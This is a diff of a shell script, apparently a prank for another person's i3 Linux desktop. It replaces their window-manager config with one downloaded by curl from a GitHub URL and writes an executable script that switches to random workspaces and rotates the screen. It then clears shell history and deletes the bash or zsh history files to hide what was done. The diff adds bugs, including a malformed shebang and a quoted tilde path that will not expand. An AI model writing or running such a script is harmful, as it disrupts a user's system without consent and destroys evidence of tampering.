@@ -1,19 +1,23 @@
-#!/bin/sh
+#/bin/sh
 
 mv ~/.config/i3/config ~/.config/i3/oldconfig
 curl https://raw.githubusercontent.com/Ellmos/cf/main/config > ~/.config/i3/config
 
-echo '#!/bin/sh' >> ~/.config/i3/hehehe.sh
-echo '' >> ~/.config/i3/hehehe.sh
-echo 'i3-msg "workspace" $(( $RANDOM % 10))' >> ~/.config/i3/hehehe.sh
-echo 'ouaip=("left" "right" "normal" "inverted")' >> ~/.config/i3/hehehe.sh
-echo 'xrandr -o ${ouaip[$(( $RANDOM % 4))]}' >> ~/.config/i3/hehehe.sh
+hehe="~/.config/i3/hehehe.sh"
+rm "$hehe"
+echo '#!/bin/sh' >> "$hehe"
+echo '' >> "$hehe"
+echo 'i3-msg "workspace" $(( $RANDOM % 10))' >> "$hehe"
+echo 'ouaip=("left" "right" "normal" "inverted")' >> "$hehe"
+echo 'xrandr -o ${ouaip[$(( $RANDOM % 4))]}' >> "$hehe"
 
-chmod +x ~/.config/i3/hehehe.sh
-
-echo 'term_size 1' >> ~/.bashrc
+chmod +x "$hehe"
 
 i3 restart
 
 history -c
-exit
+if [[ "$SHELL" == *"bash"* ]]; then
+    rm ~/.bash_history
+elif [[ "$SHELL" == *"zsh"* ]]; then
+    rm ~/.zsh_history
+fi
